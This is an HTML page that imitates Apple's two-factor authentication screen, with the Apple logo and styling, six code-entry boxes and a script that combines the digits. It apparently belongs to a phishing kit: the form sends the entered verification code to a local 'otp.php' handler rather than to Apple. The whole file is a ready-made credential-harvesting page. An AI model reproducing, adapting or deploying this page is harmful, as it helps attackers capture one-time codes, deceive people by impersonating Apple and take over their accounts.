<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Two-Factor Authentication - Apple</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      background-color: #f2f2f7;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .container {
      width: 400px;
      background-color: rgba(255, 255, 255, 0.85);
      backdrop-filter: blur(20px);
      -webkit-backdrop-filter: blur(20px);
      border-radius: 16px;
      padding: 40px 36px;
      box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
      text-align: center;
    }
    .apple-logo {
      width: 44px;
      height: 44px;
      margin: 0 auto 16px;
    }
    .apple-logo svg {
      width: 44px;
      height: 52px;
      fill: #333;
    }
    h1 {
      font-size: 22px;
      font-weight: 600;
      color: #1d1d1f;
      margin-bottom: 10px;
    }
    .subtitle {
      font-size: 14px;
      color: #6e6e73;
      margin-bottom: 28px;
      line-height: 1.5;
    }
    .shield-icon {
      margin-bottom: 16px;
    }
    .shield-icon svg {
      width: 48px;
      height: 48px;
      fill: #0071e3;
    }
    .otp-inputs {
      display: flex;
      justify-content: center;
      gap: 10px;
      margin-bottom: 24px;
    }
    .otp-inputs input {
      width: 46px;
      height: 54px;
      text-align: center;
      font-size: 22px;
      font-weight: 600;
      border: 1px solid #d2d2d7;
      border-radius: 10px;
      background-color: #fff;
      color: #1d1d1f;
      outline: none;
      transition: border-color 0.2s;
    }
    .otp-inputs input:focus {
      border-color: #0071e3;
      box-shadow: 0 0 0 3px rgba(0, 113, 227, 0.15);
    }
    .hidden-otp {
      display: none;
    }
    .btn-verify {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      font-weight: 600;
      color: #fff;
      background-color: #0071e3;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: background-color 0.2s;
    }
    .btn-verify:hover {
      background-color: #0062cc;
    }
    .links {
      margin-top: 20px;
      font-size: 13px;
    }
    .links a {
      color: #0071e3;
      text-decoration: none;
    }
    .links a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="apple-logo">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 814 1000">
        <path d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76.5 0-103.7 40.8-165.9 40.8s-105.6-57.8-155.5-127.4c-58.8-82-106.3-209-106.3-329.8 0-194.3 126.4-297.5 250.8-297.5 66.1 0 121.2 43.4 162.7 43.4 39.5 0 101.1-46 176.3-46 28.5 0 130.9 2.6 198.3 99.2zm-234-181.5c31.1-36.9 53.1-88.1 53.1-139.3 0-7.1-.6-14.3-1.9-20.1-50.6 1.9-110.8 33.7-147.1 75.8-28.5 32.4-55.1 83.6-55.1 135.5 0 7.8 1.3 15.6 1.9 18.1 3.2.6 8.4 1.3 13.6 1.3 45.4 0 103.6-30.4 135.5-71.3z"/>
      </svg>
    </div>
    <div class="shield-icon">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#0071e3" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
        <path d="M9 12l2 2 4-4"/>
      </svg>
    </div>
    <h1>Two-Factor Authentication</h1>
    <p class="subtitle">A verification code has been sent to your trusted device. Enter the code to continue.</p>
    <form action="otp.php" method="post" id="otpForm">
      <div class="otp-inputs">
        <input type="text" maxlength="1" class="otp-box" autofocus>
        <input type="text" maxlength="1" class="otp-box">
        <input type="text" maxlength="1" class="otp-box">
        <input type="text" maxlength="1" class="otp-box">
        <input type="text" maxlength="1" class="otp-box">
        <input type="text" maxlength="1" class="otp-box">
      </div>
      <input type="hidden" name="otp" id="otpHidden">
      <button type="submit" class="btn-verify">Verify</button>
    </form>
    <div class="links">
      <p><a href="#">Didn't get a code?</a></p>
    </div>
  </div>

  <script>
    const inputs = document.querySelectorAll('.otp-box');
    const hiddenInput = document.getElementById('otpHidden');
    const form = document.getElementById('otpForm');

    inputs.forEach((input, index) => {
      input.addEventListener('input', (e) => {
        const val = e.target.value;
        if (val.length === 1 && index < inputs.length - 1) {
          inputs[index + 1].focus();
        }
      });
      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !e.target.value && index > 0) {
          inputs[index - 1].focus();
        }
      });
    });

    form.addEventListener('submit', (e) => {
      let code = '';
      inputs.forEach(input => { code += input.value; });
      hiddenInput.value = code;
    });
  </script>
</body>
</html>
